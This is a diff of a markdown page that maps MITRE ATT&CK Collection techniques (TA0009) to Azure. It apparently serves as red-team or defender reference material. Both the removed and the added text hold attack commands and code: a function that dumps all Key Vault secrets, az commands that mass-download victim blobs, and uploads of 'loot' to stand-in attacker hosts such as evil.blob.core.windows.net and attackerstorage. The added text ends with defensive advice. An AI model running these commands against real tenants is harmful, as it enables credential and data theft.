@@ -1,181 +1,99 @@
 # Collection TA0009
 
-## Overview
+## **Collection Techniques in Azure Environments**
 
-In Azure environments, TA0009 – Collection refers to the stage where attackers, after gaining access, begin harvesting sensitive data such as secrets, credentials, configurations, storage contents, and database records. Leveraging Azure-native services like Key Vault, Blob Storage, Azure SQL, and DevOps Repos, adversaries may use legitimate APIs and tools (e.g., Azure CLI, SDKs, or Automation Runbooks) to automate data collection. Common tactics include enumerating all secrets in a Key Vault, dumping blob contents using stolen SAS tokens, extracting credentials from pipeline variables or configuration files, and staging collected data in attacker-controlled or compromised storage accounts. These techniques often blend in with normal cloud operations, making them harder to detect unless proper logging, anomaly detection, and least-privilege access models are in place.
+In Microsoft Azure, adversaries use Collection techniques to **gather sensitive information** once inside the environment.\
+This phase involves **harvesting data from storage accounts, databases, repositories**, and **staging it** for exfiltration.
 
-### T1119 – **Automated Collection**
+Collection is often **automated** with scripts, Azure CLI, REST APIs, or by pivoting through storage and app services.
 
-Adversaries abuse Azure Automation, Logic Apps, and Functions to script the collection of data.
+***
 
-#### Attack Examples:
+#### 📥 Automated Collection
 
-* Create a malicious runbook to collect and exfiltrate Key Vault secrets:
+\| MITRE ID | **T1119** |
 
-```powershell
-az automation runbook create --automation-account MalAuto --name CollectSecrets --type PowerShell
-```
+**Description**:\
+Adversaries automatically collect data from Azure services (e.g., Storage Accounts, Cosmos DB, SQL Databases) using scripts, CLI tools, API calls, or agentless collection mechanisms.
 
-* Abuse Logic Apps to pull data from SharePoint, Outlook, or SQL DB:
-
-```json
-"trigger": {
-  "type": "Recurrence",
-  "frequency": "Minute",
-  "interval": 5
-},
-"actions": {
-  "get_secret": {
-    "type": "Http",
-    "inputs": {
-      "method": "GET",
-      "uri": "https://myvault.vault.azure.net/secrets/SecretName?api-version=7.1"
-    }
-  }
-}
-```
-
-* Use Azure Functions as persistent backdoors to automate dumps:
-
-```python
-// Timer-triggered function to pull secrets
-import logging
-import azure.functions as func
-from azure.identity import DefaultAzureCredential
-from azure.keyvault.secrets import SecretClient
-
-def main(mytimer: func.TimerRequest) -> None:
-    if mytimer.past_due:
-        logging.warning("The timer is past due!")
-
-    # Replace with your actual Key Vault URI
-    key_vault_url = "https://<your-keyvault-name>.vault.azure.net/"
-
-    # Use managed identity or Azure CLI for auth
-    credential = DefaultAzureCredential()
-
-    # Initialize SecretClient
-    secret_client = SecretClient(vault_url=key_vault_url, credential=credential)
-
-    logging.info(f"[*] Enumerating secrets in: {key_vault_url}")
-
-    # List all secret properties
-    try:
-        secret_properties = secret_client.list_properties_of_secrets()
-
-        for secret_prop in secret_properties:
-            secret_name = secret_prop.name
-            secret = secret_client.get_secret(secret_name)
-
-            # Log or exfiltrate the secret value (⚠️ only log for PoC/testing!)
-            logging.info(f"[+] Secret: {secret.name} = {secret.value}")
-
-    except Exception as e:
-        logging.error(f"[!] Error accessing secrets: {e}")
-```
-
-### T1530 – **Data from Cloud Storage Object**
-
-Adversaries access Azure Storage (Blobs, Queues, Files) to collect sensitive data.
-
-#### Attack Examples:
-
-* Use stolen keys or tokens to list and download blob contents:
-
-```powershell
-az storage blob list --account-name victimstorage --container-name sensitive --auth-mode key
-az storage blob download --container-name sensitive --name db-backup.bak --file loot.bak
-```
-
-* Abuse **misconfigured public blobs**:
+**Azure Example**:
 
 ```bash
-# Public URL access without auth
-https://victimstorage.blob.core.windows.net/backups/secret.zip
+bashCopyEditaz storage blob download-batch --account-name victimstorage --destination ./loot --source secrets
 ```
 
-* Extract files from **File Shares** (if SMB access is allowed):
+✅ **Result**: Mass download of blobs/files using Azure CLI or SDKs.
+
+***
+
+#### ☁️ Data from Cloud Storage
+
+\| MITRE ID | **T1530** |
+
+**Description**:\
+Harvest data from Azure Blob Storage, Azure Files, Data Lakes, or Storage Shares — especially misconfigured public storage or exposed access keys.
+
+**Azure Example**:
 
 ```bash
-az storage share list --account-name victimstorage
-az storage file download --share-name sharedfiles --path finance.xlsx --dest ./finance.xlsx
+bashCopyEditaz storage blob list --account-name victimstorage --container-name secrets --output table
 ```
 
-### T1213 – **Data from Information Repositories**
+✅ **Result**: Exfiltration-ready files directly pulled from Azure Storage.
 
-Includes:
+***
 
-* **T1213.001 – Databases**
-* **T1213.003 – Code Repositories**
+#### 🗄️ Data from Information Repositories
 
-#### 💥 Attack Examples:
+\| MITRE ID | **T1213** |
 
-**T1213.001 – Azure SQL / Cosmos DB / Table Storage:**
+**Description**:\
+Steal sensitive data from Azure-hosted databases (SQL DBs, Cosmos DB, Key Vault secrets) or information repositories (App Service settings, Logic Apps).
 
-* Query sensitive data post-compromise:
-
-```sql
-SELECT * FROM users WHERE is_admin=1;
-```
-
-* Abuse leaked connection strings from `local.settings.json` or pipeline variables:
+**Azure Example**:
 
 ```bash
-az cosmosdb sql query --account-name mydb --query "SELECT * FROM Orders"
+bashCopyEditaz sql db list --resource-group victim-rg --server victim-sqlserver
+az keyvault secret list --vault-name victimvault
 ```
 
-**T1213.003 – Azure DevOps:**
+✅ **Result**: Access to credentials, application secrets, or sensitive structured data.
 
-* Clone Git repos to extract hardcoded secrets, tokens:
+***
+
+#### 🗃️ Data Staged → Remote Data Staging
+
+\| MITRE ID | **T1074.002** |
+
+**Description**:\
+Move collected data to an attacker-controlled cloud storage account, intermediate Azure resource (e.g., new Storage Account, VM), or externally hosted repository before full exfiltration.
+
+**Azure Example**:
 
 ```bash
-git clone https://dev.azure.com/org/project/_git/repo
+bashCopyEditaz storage blob upload-batch --destination https://attackerstorage.blob.core.windows.net/staging --source ./loot
 ```
 
-* Pull pipeline secrets and variables:
+✅ **Result**: Covertly stage exfiltrated data for later retrieval.
 
-```bash
-az pipelines variable list --org https://dev.azure.com/org --project proj
-```
+***
 
-* Search repos for secrets:
+## 📊 **Collection Techniques in Azure (MITRE Mapped)**
 
-```bash
-git grep -i "apikey\|password\|secret"
-```
+| Technique/Subtechnique             | MITRE ID  | Azure Example                                            |
+| ---------------------------------- | --------- | -------------------------------------------------------- |
+| Automated Collection               | T1119     | Mass download of blobs/files using CLI or API            |
+| Data from Cloud Storage            | T1530     | Enumerate and steal Azure Blob/Files data                |
+| Data from Information Repositories | T1213     | Query Azure SQL, Cosmos DB, Key Vault for secrets        |
+| Remote Data Staging                | T1074.002 | Upload loot to external Storage Account for exfiltration |
 
-### T1074.002 – **Data Staged: Cloud Storage (Remote Data Staging)**
+***
 
-Adversaries temporarily stage stolen data in cloud storage to prep for exfil.
+## 🎯 Final Summary
 
-#### 💥 Attack Examples:
+Defending against Collection in Azure focuses on:
 
-* Upload collected loot to attacker-controlled Azure Storage:
-
-```bash
-az storage blob upload --account-name evilstore --container-name staging --file secrets.zip --name staging.zip
-```
-
-* Use compromised internal storage account as a staging area to blend in:
-
-```bash
-az storage blob upload --container-name temp --file ./loot.txt --name creds.txt
-```
-
-* Abuse Azure Functions or Logic Apps to write staged data:
-
-```csharp
-// Function writes loot to attacker container
-var blobClient = new BlobClient("https://evil.blob.core.windows.net/stash/loot.txt", cred);
-blobClient.Upload(BinaryData.FromString("stolen secrets"));
-```
-
-### ✅ Summary Table
-
-| MITRE Technique                   | Azure Attack Example                                                |
-| --------------------------------- | ------------------------------------------------------------------- |
-| **T1119** Automated Collection    | Automation Runbooks, Logic Apps, Azure Functions harvesting secrets |
-| **T1530** Cloud Storage Object    | Blob listing/downloading via stolen keys or public blobs            |
-| **T1213.001** DB Repositories     | SQL/Cosmos DB queries with stolen creds or tokens                   |
-| **T1213.003** Code Repos          | Clone repos, extract secrets from Azure DevOps/GitHub               |
-| **T1074.002** Remote Data Staging | Upload loot to Azure Storage for exfil or persistence               |
+* **Securing storage accounts, databases, and repositories with strict access control**
+* **Monitoring download and data access anomalies (Defender for Cloud, Sentinel)**
+* **Detecting suspicious data staging or movement between subscriptions/storage accounts**
+* **Preventing mass data gathering through throttling, logging, and behavior analytics**
